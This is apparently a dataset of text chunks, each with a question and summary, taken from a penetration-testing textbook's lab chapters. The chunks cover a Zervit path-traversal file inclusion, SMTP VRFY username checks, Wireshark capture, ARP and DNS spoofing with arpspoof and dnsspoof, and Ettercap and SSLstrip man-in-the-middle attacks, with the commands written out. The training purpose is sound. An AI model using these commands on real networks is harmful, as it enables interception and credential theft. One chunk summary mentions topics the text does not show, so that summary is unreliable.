the\ndefault credentials for WebDAV, which we will be able to exploit. Now that\nwe have access to WebDAV, we can upload files to the web server. manual analysis\nSometimes, no solution will work nearly as well as manual vulnerability\nanalysis to see if a service will lead to a compromise, and there’s no better\nway to improve than practice. In the sections that follow we’ll explore some\npromising leads from our port and vulnerability scanning. Exploring a Strange Port\nOne port that has failed to come up in our automated scans is 3232 on our\nWindows target. If you try scanning this port with an Nmap version scan (as\nwe did at the end of Chapter 5), you’ll notice that it crashes. This behavior\nsuggests that the listening program is designed to listen for a particular\ninput and that it has difficulty processing anything else. This sort of behavior is interesting to pentesters, because programs\nthat crash when handling malformed input aren’t validating input properly. Recall from Chapter 5 that in the process of crashing the program, the out-\nput led us to believe that the software is a web server. Connecting to the port\nwith a browser, as shown in Figure 6-17, confirms this. Figure 6-17: Web server on port 3232\nThe web page served doesn’t tell us much, but from here we can con-\nnect to the port manually using Netcat. We know this is a web server, so we\nwill talk to it as such. We know we can browse to the default web page, so\nwe can enter GET / HTTP/1.1 to ask the web server for the default page (see\nListing 6-12). Finding Vulnerabilities 151\nroot@kali:~# nc 192.168.20.10 3232\nGET / HTTP/1.1\nHTTP/1.1 200 OK\nServer: Zervit 0.4 u\nX-Powered-By: Carbono\nConnection: close\nAccept-Ranges: bytes\nContent-Type: text/html\nContent-Length: 36\n<html>\n<body>\nhi\n</body>\n</html>root@bt:~#\nListing 6-12: Connecting to a port with Netcat\nThe server announces itself as Zervit 0.4 u. It doesn’t look good for the\nsoftware because the first autocomplete entry in a search for Zervit 0.4 on\nGoogle is “Zervit 0.4 exploit.” This web server software is subject to mul-\ntiple security issues, including a buffer overflow and a local file inclusion\nvulnerability, which allows us to serve other files on the system. This service\nis so sensitive that it may be best to avoid buffer overflow attacks, because\none false move will crash it. The local file inclusion, on the other hand,\nlooks promising. We know the server can process HTTP GET requests. For\nexample, we can download Windows XP’s boot.ini file by moving back five\ndirectories to the C drive using GET, as shown in Listing 6-13. root@kali:~# nc 192.168.20.10 3232\nGET /../../../../../boot.ini HTTP/1.1\nHTTP/1.1 200 OK\nServer: Zervit 0.4\nX-Powered-By: Carbono\nConnection: close\nAccept-Ranges: bytes\nContent-Type: application/octet-stream\nContent-Length: 211\n[boot loader]\ntimeout=30\ndefault=multi(0)disk(0)rdisk(0)partition(1)\\WINDOWS\n[operating systems]\nmulti(0)disk(0)rdisk(0)partition(1)\\WINDOWS=\"Microsoft Windows XP Home\nEdition\" /fastdetect /NoExecute=OptIn\nListing 6-13: Local file inclusion in Zervit 0.4\nWe’re able to pull down boot.ini, a config file that tells Windows which\noperating system options to display at boot time. We’ll use this local file\ninclusion to pull down additional sensitive files in Chapter 8. 152 Chapter 6\nFinding Valid Usernames\nWe can drastically increase our chances of a successful password attack if\nwe know valid usernames for services. (We’ll explore this in more detail in\nChapter 9.) One way to find valid usernames for mail servers is to use the\nVRFY SMTP command, if it is available. As the name implies, VRFY verifies if a\nuser exists. NSE found the VRFY verb is enabled on the Windows XP target in\nthe previous chapter. Connect to TCP port 25 using Netcat, and use VRFY to\ncheck for usernames, as shown in Listing 6-14. root@kali:~# nc 192.168.20.10 25\n220 georgia.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here\nVRFY georgia\n250 Georgia<georgia@>\nVRFY john\n551 User not local\nListing 6-14: Using the SMTP VRFY command\nUsing VRFY we see that georgia is a valid username, but there is no user\ncalled john. We will look at using valid usernames to try to guess passwords\nin Chapter 9. summary\nIn this chapter, we have touched on various methods to find exploitable vul-\nnerabilities on our targets. Using a variety of tools and techniques, we were\nable to find myriad ways to go after our targets, including our trusty MS08-\n067 exploit against our Windows XP SMB server and a local file inclusion\nvulnerability on the Zervit 0.4 web server that will allow us to download\nsystem files. Using VRFY, we found a valid username that we can use in\npassword-guessing attacks on the mail server. We learned that the SLMail server may have a vulnerability in the\nPOP3 service based on its reported version number (though we were not\nable to find out for sure), and we found an open phpMyAdmin install on\nthe web server that gives us root access to the underlying database, as well\nas an XAMPP install with default credentials for WebDAV that will allow\nus to upload files to the web server. On the Linux target, we found an NFS\nshare with write access that allows us to write to a user’s .ssh directory, and\nwe discovered a not-readily-apparent TikiWiki install on the web server\nthat appears to contain a code execution vulnerability. The Vsftpd 2.3.4\nFTP server may have a hidden backdoor due to a compromise of the Vsftpd\nrepositories. At this point in the book we can see that our Windows XP and Linux\ntarget machines suffer from a lot of issues. The lack of attack surface on our\nWindows 7 target makes it seem pretty safe, but as we will see a bit later, that\nsolid exterior hides a few holes underneath. Before we move on to exploit-\ning these vulnerabilities, the next chapter will look at capturing traffic to\ngain sensitive information such as login credentials. Finding Vulnerabilities 153\n7\nCaPturing tr affiC\nBefore we move on to exploitation, we’ll use the\nWireshark monitoring tool, as well as other tools, to\nsniff and manipulate traffic to gain useful informa-\ntion from other machines on the local network. On\nan internal penetration test, when we’re simulating an\ninsider threat or an attacker who has breached the\nperimeter, capturing traffic from other systems in the network can give\nus additional interesting information (perhaps even usernames and pass-\nwords) that can help us with exploitation. The trouble is that capturing\ntraffic can produce a massive amount of potentially useful data. Capturing\nall traffic on just your home network could quickly fill several Wireshark\nscreens, and discovering which traffic is useful for a pentest can be difficult. In this chapter, we’ll look at several ways to manipulate a network to get\naccess to traffic we have no business being able to see. networking for Capturing traffic\nIf you find yourself in a network that uses hubs rather than switches, cap-\nturing traffic not intended for your machine will be easy, because when a\nnetwork hub receives a packet, it rebroadcasts it on all ports, leaving it up\nto each device to decide whom the packet belongs to. In a hubbed network,\ncapturing other systems’ traffic is as easy as selecting Use promiscuous mode\non all interfaces in Wireshark. This tells our Network Interface Controller\n(NIC) to grab everything it sees, which in a hubbed network will be every\npacket. Unlike hubs, switches send traffic only to the intended system, so on a\nswitched network, we won’t be able to view, for example, all the traffic to\nand from the domain controller without fooling the network into sending\nus that traffic. Most networks you encounter on pentests will probably be\nswitched networks; even some legacy network hardware that claims to be\na hub may have the functionality of a switch. Virtual networks seem to act like hubs, because all your virtual machines\nshare one physical device. If you capture traffic in promiscuous mode in\na virtual network, you may be able to see traffic from every virtual machine\nas well as the host machine, even if you are using a switch instead of a hub in\nyour environment. To simulate a non-virtualized network, we’ll turn off Use\npromiscuous mode on all interfaces in Wireshark, which means we will have\nto work a little harder to capture traffic from our target virtual machines. using wireshark\nWireshark is a graphical network protocol analyzer that lets us take a deep\ndive into the individual packets moving around the network. Wireshark\ncan be used to capture Ethernet, wireless, Bluetooth, and many other kinds\nof traffic. It can decode different protocols that it sees, so you could, for\ninstance, reconstruct the audio of Voice over IP (VoIP) phone calls. Let’s\ntake a look at the basics of using Wireshark to capture and analyze traffic. Capturing Traffic\nLet’s start by using Wireshark to capture traffic on our local network. Start Wireshark in Kali, as shown here. Click through any warnings about\nusing Wireshark as root being dangerous. root@kali:~# wireshark\nTell Wireshark to capture on the local network interface (eth0) by select-\ning Capture4Options, and selecting the eth0 option, as shown in Figure 7-1. Remember to uncheck the Use promiscuous mode on all interfaces option so\nthat the results will be like those on a physical switched network rather than\nthe VMware network. Exit the Options menu. Finally, click Capture4Start\nto begin the traffic capture. 156 Chapter 7\nYou should start to see traffic coming in, and you should be able to cap-\nture all traffic intended for the Kali machine as well as any broadcast traffic\n(traffic sent to the entire network).",
    "question": "",
    "summary": "This chapter covers using Metasploit and Nmap for vulnerability scanning, including setting up a handler, performing SYN and version scans, and using NSE scripts to identify potential vulnerabilities. It also discusses open-source intelligence gathering tools like Netcraft, Whois, and Maltego, as well as manual analysis and exploitation techniques. The chapter highlights the importance of identifying and verifying vulnerabilities before attempting to exploit them, and provides examples of how to use various tools to find and analyze weaknesses in target systems."
  },
  {
    "start": 51,
    "end": 57,
    "text": "Figure 7-1: Starting a Wireshark capture\nTo illustrate the traffic we can capture in a switched network, let’s start\nby contacting our Windows XP target from our Kali machine over FTP. Log in as anonymous, as shown in Listing 7-1, to see the captured traffic in\nWireshark. (In the previous chapter, we discovered that the anonymous user\nis allowed on the Windows XP target. Although anonymous requires that you\nenter a password, it doesn’t matter what it is. Traditionally, it is an email\naddress, but the FTP server will accept whatever you would like to use.)\nroot@kali:~# ftp 192.168.20.10\nConnected to 192.168.20.10. 220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\nName (192.168.20.10:root): anonymous\n331 Password required for anonymous\nPassword:\n230 Logged on\nRemote system type is UNIX. ftp>\nListing 7-1: Logging in via FTP\nCapturing Traffic 157\nYou should see packets in Wireshark from the system with IP address\n\n192.168.20.9 to 192.168.20.10 and vice versa, with the Protocol field marked\nas FTP. Wireshark is capturing the traffic moving to and from our Kali\nmachine.\nSwitch over to your Ubuntu Linux target machine, and log in to the\nFTP server on the Windows XP target. Looking back at Wireshark in Kali,\nyou should see that no additional FTP packets have been captured. In our\nsimulated switched network, any traffic not destined for our Kali machine\nwill not be seen by the network interface and, thus, will not be captured by\nWireshark. (We’ll learn how to rectify this situation and capture other sys-\ntems’ traffic in “ARP Cache Poisoning” on page 160.)\nFiltering Traffic\nThe sheer volume of network traffic captured by Wireshark can be a bit\noverwhelming because, in addition to our FTP traffic, every other packet\nto or from the Kali system is captured. To find specific interesting packets,\nwe can use Wireshark filters. The Filter field is located at the top left of\nthe Wireshark GUI. As a very simple first Wireshark filtering example, let’s\nlook for all traffic that uses the FTP protocol. Enter ftp in the Filter field\nand click Apply, as shown in Figure 7-2.\nFigure 7-2: Filtering traffic in Wireshark\nAs expected, Wireshark filters the captured packets to show only those\nthat use the FTP protocol. We can see our entire FTP conversation, includ-\ning our login information, in plaintext.\n158 Chapter 7\nWe can use more advanced filters to further fine-tune the packets\nreturned. For example, we can use the filter ip.dst==192.168.20.10 to return\nonly packets with the destination IP address 192.168.20.10. We can even\nchain filters together, such as using the filter ip.dst==192.168.20.10 and ftp\nto find only FTP traffic destined for 192.168.20.10.\nFollowing a TCP Stream\nEven after filtering traffic, there may be multiple FTP connections captured\nduring the same time frame, so it could still be difficult to tell what’s going\non. But once we find an interesting packet, such as the beginning of an FTP\nlogin, we can dig deeper into the conversation by right-clicking the packet\nand selecting Follow TCP Stream, as shown in Figure 7-3.\nFigure 7-3: Following the TCP stream in Wireshark\nThe resulting screen will show us the full contents of our FTP connec-\ntion, including its credentials in plaintext, as shown in Listing 7-2.\n220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\nUSER anonymous\n331 Password required for anonymous\nPASS georgia@bulbsecurity.com\n230 Logged on\n\nSYST\n215 UNIX emulated by FileZilla\nListing 7-2: FTP login conversation\nCapturing Traffic 159\nDissecting Packets\nBy selecting a specific captured packet, we can get more information about\nthe captured data, as shown in Figure 7-4. At the bottom of the Wireshark\nscreen, you can see details of the selected packet. With a little guidance,\nWireshark will break down the data for you. For example, we can easily\nfind the TCP destination port by selecting the TCP entry and looking for\nDestination port, as highlighted in the figure. When we select this field,\nthe entry in the raw bytes of the packet is highlighted as well.\nFigure 7-4: Packet details in Wireshark\narP Cache Poisoning\nWhile it is nice to see the details of our own traffic, for pentesting purposes,\nit would be preferable to see the traffic that wasn’t intended for our Kali\nsystem. Perhaps we’ll be able to capture another user’s login session that\nuses an account other than anonymous to log in; that would give us working\ncredentials for the FTP server, as well as a set of credentials that might be\nreused elsewhere in the environment.\nTo capture traffic not intended for the Kali system, we need to find\nsome way to have the relevant data sent to our Kali system. Because the\nnetwork switch will send only packets that belong to us, we need to trick\nour target machine or the switch (or ideally both) into believing the traffic\nbelongs to us. We will perform a so-called man-in-the-middle attack, which\n160 Chapter 7\nwill allow us to redirect and intercept traffic between two systems (other\nthan our own system) before forwarding packets on to the correct destina-\ntion. One tried-and-true technique for masquerading as another device on\nthe network is called Address Resolution Protocol (ARP) cache poisoning (also\nknown as ARP spoofing).\nARP Basics\nWhen we connect to another machine on our local network, we usually\nuse its hostname, fully qualified domain name, or IP address. (We’ll look\nat domain name server cache poisoning in “DNS Cache Poisoning” on\npage 167.) Before a packet can be sent from our Kali machine to the\nWindows XP target, Kali must map the IP address of the XP target machine\nto the Media Access Control (MAC) address of the network interface card\n(NIC) so Kali knows where on the network to send the packet. To do this,\nit uses ARP to broadcast “Who has IP address 192.168.20.10?” on the local\nnetwork. The machine with the IP address 192.168.20.10 writes back, “I have\n\n192.168.20.10, and my MAC address is 00:0c:29:a9:ce:92.” In our case this\nwill be the Windows XP target. Our Kali system will store the mapping from\nIP address 192.168.20.10 to the MAC address 00:0c:29:a9:ce:92 in its ARP\ncache.\nWhen it sends the next packet, our machine will first look to its ARP\ncache for an entry for 192.168.20.10. If it finds one, it will use that entry\nas the address of the target rather than sending another ARP broadcast.\n(ARP cache entries are flushed out regularly because network topology may\nchange at any time.) Thus, systems will regularly be sending ARP broad-\ncasts as their caches are flushed. This process will come in handy when we\nperform ARP cache poisoning in the next section. The ARP process is illus-\ntrated in Figure 7-5.\nWho has 192.168.20.10? Who has 192.168.20.10?\nKali\n(192.168.20.9)\nI have 192.168.20.10.\nMy MAC address is\nUbuntu target Windows XP target\n00:0c:29:a9:ce:92.\n(192.168.20.11) (192.168.20.10)\nFigure 7-5: ARP resolution process\nCapturing Traffic 161\nTo view the ARP cache in our Kali machine, enter arp. Currently, the\nonly IP address–to–MAC address mappings that it knows are 192.168.20.1,\nthe default gateway, as well as 192.168.20.10, the Windows XP machine we\nengaged in the last exercise.\nroot@kali:~# arp\nAddress HWtype HWaddress Flags Mask Iface\n\n192.168.20.1 ether 00:23:69:f5:b4:29 C eth0\n\n192.168.20.10 ether 00:0c:29:05:26:4c C eth0\nNow restart the Wireshark capture, and use the anonymous login to\ninteract with the Ubuntu target’s FTP server again. Next, use the arp\nfilter, as shown in Figure 7-6, to see the ARP broadcast from the Kali\nmachine and the reply from the Ubuntu target with its MAC address.\nFigure 7-6: ARP broadcast and reply\nCheck your Kali Linux’s ARP cache again. You should see an entry for\n\n192.168.20.10.\nroot@kali:~# arp\nAddress HWtype HWaddress Flags Mask Iface\n\n192.168.20.1 ether 00:23:69:f5:b4:29 C eth0\n\n192.168.20.10 ether 00:0c:29:05:26:4c C eth0\n\n192.168.20.11 ether 80:49:71:14:97:2b C eth0\nThe trouble with relying on ARP for addressing is that there’s no guar-\nantee that the IP address–to–MAC address answer you get is correct. Any\nmachine can reply to an ARP request for 192.168.20.11, even if that machine\nis really at 192.168.20.12 or some other IP address. The target machine will\naccept the reply, regardless.\n162 Chapter 7\nThat’s ARP cache poisoning in a nutshell. We send out a series of ARP\nreplies that tell our target that we are another machine on the network.\nThus, when the target sends traffic intended for that machine, it will instead\nsend the packets straight to us to be picked up by our traffic sniffer, as shown\nin Figure 7-7.\nRecall from “Capturing Traffic” on page 156 that we initiated an FTP\nconnection from our Ubuntu target to the Windows XP target, but the traf-\nfic flowing through that connection was not captured by Wireshark on our\nKali system. Using an ARP cache poisoning attack, we can trick the two\nsystems into sending their traffic to our Kali machine instead, to be cap-\ntured in Wireshark.\nKali forwards Kali forwards traffic\ntraffic to Ubuntu. to Windows XP.\nKali\n(192.168.20.9)\nWindows XP sends traffic\ndestined for Ubuntu to Kali.\nUbuntu sends traffic destined\nUbuntu target for Windows XP to Kali. Windows XP target\n(192.168.20.11) (192.168.20.10)\nFigure 7-7: ARP cache poisoning redirects traffic through Kali.\nIP Forwarding\nBut before we can trick the Linux target into sending credentials for the\nFTP server to us instead, we need to turn on IP forwarding to tell our Kali\nmachine to forward any extraneous packets it receives to their proper desti-\nnation. Without IP forwarding, we’ll create a denial-of-service (DoS) condition\non our network, where legitimate clients are unable to access services. For\nexample, if we were to use ARP cache poisoning without IP forwarding to\nredirect traffic from the Linux target, intended for the Windows XP target,\nto our Kali machine, the FTP server on the Windows XP machine would\nnever receive the packets from the Linux machine and vice versa.\nThe setting for IP forwarding on Kali is in /proc/sys/net/ipv4/ip_forward.\nWe need to set this value to 1.\nroot@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward\nCapturing Traffic 163\nBefore we start ARP cache poisoning, note the entry for the Windows\nXP target (192.168.20.10) in the Linux target’s ARP cache. This value will\nchange to the MAC address of the Kali machine after we commence ARP\ncache poisoning.\ngeorgia@ubuntu:~$ arp -a\n? (192.168.20.1) at 00:23:69:f5:b4:29 [ether] on eth2\n? (192.168.20.10) at 00:0c:29:05:26:4c [ether] on eth0\n? (192.168.20.9) at 70:56.81:b2:f0:53 [ether] on eth2\nARP Cache Poisoning with Arpspoof\nOne easy-to-use tool for ARP cache poisoning is Arpspoof. To use Arpspoof,\nwe tell it which network interface to use, the target of our ARP cache poi-\nsoning attack, and the IP address we would like to masquerade as. (If you\nleave out the target, you’ll poison the entire network.) For our example, to\nfool the Linux target into thinking we are the Windows XP machine, I set\nthe -i option as eth0 to specify the interface, the -t option as 192.168.20.11\nto specify the target as the Linux box, and 192.168.20.10 as the Windows XP\nmachine I want to pretend to be.\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.10\nArpspoof immediately starts sending ARP replies to the Linux target,\ninforming it that the Windows XP machine is located at the Kali machine’s\nMAC address. (ARP cache entries are updated at varying times among dif-\nferent implementations, but one minute is a safe length of time to wait.)\nTo capture the other side of the conversation, we need to fool the\nWindows XP machine into sending traffic intended for the Linux target to\nthe Kali machine as well. Start another instance of Arpspoof, and this time\nset the target as the Windows XP machine and the recipient as the Linux\nmachine.\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.10 192.168.20.11\nOnce you start ARP cache poisoning, check your Linux target’s ARP\ncache again. Notice that the MAC address associated with the Windows XP\ntarget has changed to 70:56:81:b2:f0:53. The Linux target should send all\ntraffic intended for the Windows XP target to the Kali machine, where we\ncan capture it in Wireshark.\ngeorgia@ubuntu:~$ arp -a\n? (192.168.20.1) at 00:23:69:f5:b4:29 [ether] on eth0\n? (192.168.20.10) at 70:56:81:b2:f0:53 [ether] on eth0\n164 Chapter 7\nNow log in to the Windows XP target’s FTP server from the Linux target\nusing another account (see Listing 7-3). (The credentials georgia:password\nwill work if you followed my instructions in Chapter 1. If you set your cre-\ndentials as something else, use those instead.)\ngeorgia@ubuntu:~$ ftp 192.168.20.10\nConnected to 192.168.20.10.\n220-FileZilla Server version 0.9.32 beta\n220-written by Tim Kosse (Tim.Kosse@gmx.de)\n220 Please visit http://sourceforge.net/projects/filezilla/\nName (192.168.20.10:georgia): georgia\n331 Password required for georgia\nPassword:\n230 Logged on\nRemote system type is UNIX.\nListing 7-3: Logging in to FTP on Windows XP from the Ubuntu target with a user account\nBecause we have IP forwarding turned on, everything appears to work\nnormally as far as our user is concerned. Returning to Wireshark, we see\nthat this time we were able to capture the FTP traffic and read the plaintext\nlogin credentials. The Wireshark output shown in Figure 7-8 confirms that\nour Kali machine is forwarding the FTP traffic between the two targets.\nAfter each FTP packet, there is a retransmission packet.\nFigure 7-8: Wireshark captures the login information.\nUsing ARP Cache Poisoning to Impersonate the Default Gateway\nWe can also use ARP cache poisoning to impersonate the default gateway\non a network and access traffic entering and leaving the network, includ-\ning traffic destined for the Internet. Stop the Arpspoof processes you have\nCapturing Traffic 165\nrunning, and try tricking the Linux target into routing all traffic to the\ngateway through the Kali machine by impersonating the default gateway,\nas shown here.\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.1\nroot@kali:~# arpspoof -i eth0 -t 192.168.20.1 192.168.20.11\nIf we start to browse the Internet from the Linux target, we should see\nHTTP packets being captured by Wireshark. Even if sensitive information is\nencrypted with HTTPS, we’ll still be able to see where users are going and\nany other information sent over HTTP. For example, if we run a Google\nquery, the plaintext of the query will be captured in Wireshark, as shown in\nFigure 7-9.\nnote If you use ARP cache poisoning to trick a large network into thinking your pentest\nmachine is the default gateway, you may unwittingly cause networking issues. All the\ntraffic in a network going through one laptop (or worse, one virtual machine) can\nslow things down to the point of denial of service in some cases.\nFigure 7-9: Query captured in Wireshark\n166 Chapter 7\ndns Cache Poisoning\nIn addition to ARP cache poisoning, we can also poison Domain Name\nService (DNS) cache entries (mappings from domain names to IP addresses)\nto route traffic intended for another website to one we control. Just as ARP\nresolves IP to MAC addresses to properly route traffic, DNS maps (or\nresolves) domain names such as www.gmail.com to IP addresses.\nTo reach another system on the Internet or local network, our machine\nneeds to know the IP address to connect to. It is easy to remember the URL\nwww.gmail.com if we want to visit our web mail account, but it’s difficult to\nremember a bunch of IP addresses, which may even change regularly. DNS\nresolution translates the human-readable domain name into an IP address.\nFor example, we can use the tool Nslookup to translate www.gmail.com into an\nIP address, as shown in Listing 7-4.\nroot@kali~# nslookup www.gmail.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nwww.gmail.com canonical name = mail.google.com.\nmail.google.com canonical name = googlemail.l.google.com.\nName: googlemail.l.google.com\nAddress: 173.194.37.85\nName: googlemail.l.google.com\nAddress: 173.194.37.86\nListing 7-4: Nslookup DNS resolution\nAs you can see, Nslookup translates www.gmail.com to a number of IP\naddresses, including 173.194.37.85 and 173.194.37.86, all of which we can\nuse to reach Gmail. To perform DNS resolution (Figure 7-10), our system\nqueries its local DNS server for information about a specific domain name,\nsuch as www.gmail.com. If the DNS server has a cache entry for the address,\nit gives our system the correct IP address. If not, it contacts other DNS serv-\ners on the Internet looking for the correct information.\nWhen the correct IP address is returned, the DNS server writes back\nto our machine with the correct IP address resolution for www.gmail.com,\nand our system then translates www.gmail.com into 173.194.37.85, as shown\nin Listing 7-4. Users can then access www.gmail.com by name without having\nto use the IP address.\nCapturing Traffic 167\nwww.gmail.com\nis at 173.194.37.85.\nDNS server www.gmail.com\nInternet\nI don’t know\nBrowse to www.gmail.com.\n\n173.194.37.85. I’ll ask another\nDNS server.\nI want to browse to\nwww.gmail.com.\nWhat’s the IP address?\nKali www.gmail.com local DNS server\nis at 173.194.37.85.\nFigure 7-10: DNS resolution\nGetting Started\nDNS cache poisoning works like ARP cache poisoning: We send a bunch\nof bogus DNS resolution replies pointing to the wrong IP address for a\ndomain name.\nNow make sure the Apache server is running with the command service\napache2 start.\nroot@kali:~# service apache2 start\n* Starting web server apache2 [ OK ]\nBefore we use a DNS cache poisoning tool, we need to create a file that\nspecifies which DNS names we would like to spoof and where to send traffic.\nFor example, let’s tell any system that runs a DNS resolution for www.gmail\n.com that that domain’s IP address is our Kali machine by adding the entry\n168 Chapter 7\n\n192.168.20.9 www.gmail.com to a new file called hosts.txt. (You can name the\nfile anything you like.)\nroot@kali:~# cat hosts.txt\n\n192.168.20.9 www.gmail.com\nUsing Dnsspoof\nRestart Arpspoof between the Linux target and the default gateway and\nvice versa as discussed in “Using ARP Cache Poisoning to Impersonate the\nDefault Gateway” on page 165. Now we can start sending DNS cache poi-\nsoning attempts using the Dnsspoof DNS spoofing tool, as shown here.\nroot@kali:~# dnsspoof -i eth0u -f hosts.txtv\ndnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.20.9]",
    "question": "What is ARP cache poisoning and how can it be used to capture traffic intended for other devices on a switched network?",
    "summary": "The text explains how to capture and analyze network traffic using Wireshark, focusing on FTP communication between a Kali machine and a Windows XP target. It also describes ARP cache poisoning, a technique to redirect traffic between two systems through Kali, allowing the capture of data intended for other devices. Additionally, it touches on DNS cache poisoning as another method to intercept and manipulate network traffic."
  },
  {
    "start": 58,
    "end": 66,
    "text": "192.168.20.11 > 75.75.75.75.53: 46559+ A? www.gmail.com\nWe specify the network interface u to use, and point Dnsspoof to the\nfile (hosts.txt) we just created v telling it which values to spoof. Once Dnsspoof is running, when we run the nslookup command from\nour Linux target, the IP address returned should be our Kali machine’s, as\nshown in Listing 7-5. This is clearly not the real IP address for Gmail. georgia@ubuntu:~$ nslookup www.gmail.com\nServer: 75.75.75.75\nAddress: 75.75.75.75#53\nNon-authoritative answer:\nName: www.gmail.com\nAddress: 192.168.20.9\nListing 7-5: Nslookup after attack\nTo demonstrate this attack, set up a website to direct traffic to. The\nApache server in Kali will by default serve an “It Works” page to anyone\nwho visits it. We can change the contents of the index.html file in the folder\n/var/www, but the default “It Works” text is fine for our purposes. Now if we browse to http://www.gmail.com/ from the Ubuntu target, the\nURL bar should say http://www.gmail.com/, but we’re actually at our Kali\nmachine’s web server, as shown in Figure 7-11. We can even make this attack\nmore interesting by cloning the actual Gmail website (or any other site the\nattacker chooses) so the user won’t notice the difference. Capturing Traffic 169\nFigure 7-11: This isn’t Gmail. ssL attacks\nSo far, we’ve been able to intercept encrypted traffic, but we haven’t been\nable to get any sensitive information out of the encrypted connection. For\nthis next attack, we’ll rely on a user’s willingness to click past an SSL certifi-\ncate warning to perform a man-in-the-middle attack and get the plaintext\nout of a Secure Sockets Layer (SSL) connection, which encrypts traffic to\nprotect it from being read by an eavesdropper. SSL Basics\nThe goal of SSL is to provide reasonable assurance that any sensitive infor-\nmation (such as credentials or credit card numbers) transmitted between\na user’s browser and a server is secure—unable to be read by a malicious\nentity along the way. To prove that the connection is secure, SSL uses cer-\ntificates. When you browse to an SSL-enabled site, your browser asks the\nsite to identify itself with its SSL certificate. The site presents its certifi-\ncate, which your browser verifies. If your browser accepts the certificate, it\ninforms the server, the server returns a digitally signed acknowledgment,\nand SSL-secured communication begins. 170 Chapter 7\nAn SSL certificate includes an encryption key pair as well as identifying\ninformation, such as the domain name and the name of the company that\nowns the site. A server’s SSL certificate is generally vouched for by a certifi-\ncate authority (CA) such as VeriSign or Thawte. Browsers come preinstalled\nwith a list of trusted CAs, and if a server’s SSL certificate is vouched for by\na trusted CA, the browser can create a secure connection. If the certificate\nis untrusted, the user will be presented with a warning that basically says,\n“The connection might be secure, but it might not be. Proceed at your\nown risk.”\nUsing Ettercap for SSL Man-in-the-Middle Attacks\nIn our ARP cache poisoning attack, we man-in-the-middled the traffic\nbetween our Windows XP and Ubuntu targets (as well as the Ubuntu tar-\nget and the Internet). These systems were still able to communicate with\neach other, but our Kali system was able to capture the traffic. We can do\nthe same thing to attack SSL traffic. We can break the secure SSL connec-\ntion by redirecting traffic to and from www .facebook.com to our Kali system\nso we can intercept sensitive information. For this example, we’ll use Ettercap, a multifunction suite for man-in-\nthe-middle attacks that, in addition to SSL attacks, can also complete all\nof the attacks we have performed so far with Arpspoof and Dnsspoof. Turn\noff any other spoofing tools before starting Ettercap. See page 22 for con-\nfiguration instructions. Ettercap has multiple interfaces, but we will use the -T option for the\ntext-based interface in this example. Use the -M option with arp:remote\n/gateway/ /target/ to set up an ARP cache poisoning attack between the\ndefault gateway and the Linux target, as shown next. The actual attack\nwill work the same way as our previous exercise with Arpspoof. root@kali:~# ettercap -Ti eth0 -M arp:remote /192.168.20.1/ /192.168.20.11/\nWith Ettercap running, we just wait for users to start interacting with\nSSL-based web servers. Switch over to your Linux target, and attempt to log\nin to a website using SSL. You should be greeted with a certificate warning\nlike the one in Figure 7-12. Because this is a man-in-the-middle attack, the SSL session’s security\ncannot be verified. The certificate Ettercap presents isn’t valid for www\n.facebook.com, so the trust is broken, as illustrated in Figure 7-13. But security warnings don’t stop all users. If we click through the warn-\ning and enter our credentials, Ettercap will grab them in plaintext before\nforwarding them on to the server, as shown here:\nHTTP : 31.13.74.23:443 -> USER: georgia PASS: password INFO: https://www.facebook.com/\nCapturing Traffic 171\nFigure 7-12: Facebook cannot be verified. www.facebook.com\nHTTPS response from\nwww.facebook.com\nHTTPS request for\nwww.facebook.com\nHTTPS request for\nInternet\nwww.facebook.com\nUbuntu target Kali\nHTTPS response from\nwww.facebook.com\n(certificate from Ettercap is\ninvalid for www.facebook.com)\nFigure 7-13: SSL man-in-the-middle attack\n172 Chapter 7\nssL stripping\nOf course, the trouble with SSL man-in-the-middle attacks is that users have\nto click through the SSL certificate warning. Depending on the browser,\nthis can be an involved process that is difficult, if not impossible, for a user\nto ignore. Most readers can probably think of a time they clicked through a\nsecurity warning and continued to the page despite their better judgment. (Case in point: Our default Nessus install uses Tenable’s self-signed certifi-\ncate, which throws a certificate error when you browse to the web interface. If you chose to follow along with that example, you most likely decided to\nclick through the warning.)\nIt is difficult to say how effective certificate warnings are at stopping\nusers from visiting HTTPS sites without valid certificates. I have run social-\nengineering tests that employed self-signed SSL certificates, and the success\nrate has been significantly lower than those with valid certificates or those\nthat don’t use HTTPS. Though some users did click through and visit the\nsites, a more sophisticated attack would allow us to capture information in\nplaintext without triggering those obvious warnings that the SSL connec-\ntion is compromised. With SSL stripping, we man-in-the-middle the HTTP connection before\nit is redirected to SSL and add SSL functionality before sending the pack-\nets on to the web server. When the web server replies, SSL stripping again\nintercepts the traffic and removes the HTTPS tags before sending the pack-\nets to the client. This technique is illustrated in Figure 7-14. www.facebook.com\nHTTPS response from\nwww.facebook.com\nHTTPS request for\nwww.facebook.com\nHTTP request for\nInternet\nwww.facebook.com\nUbuntu target Kali\nHTTP response from\nwww.facebook.com\nFigure 7-14: SSL stripping attack\nMoxie Marlinspike, the author of SSLstrip, called certificate warnings\nnegative feedback, as opposed to positive feedback that a session is valid, such as\nseeing HTTPS in the browser URL bar. Avoiding this negative feedback is\nCapturing Traffic 173\nmuch more important to an attack’s success than including positive feed-\nback because users are naturally less likely to notice that a URL says HTTP\ninstead of HTTPS than they are a giant certificate warning they have to\nactively click through. SSL stripping avoids the certificate warning by again\nman-in-the-middling the connection. Users typically encounter HTTPS either through clicking links or\nthrough HTTP 302 redirects. Most users don’t enter https://www.facebook.com\nor even http://www.facebook.com into their browsers; they type www.facebook\n.com or sometimes just facebook.com. And that’s why this attack is possible. SSLstrip adds the HTTPS itself and thus the SSL connection between\nFacebook and Kali is valid. SSLstrip just turns the connection back to\nHTTP to send to the original requester. There is no certificate warning. Using SSLstrip\nThe tool SSLstrip implements SSL stripping. Before we start it, we need to set\nan Iptables rule to pass traffic that is headed to port 80 through SSLstrip. We’ll run SSLstrip on port 8080, as shown next, then restart 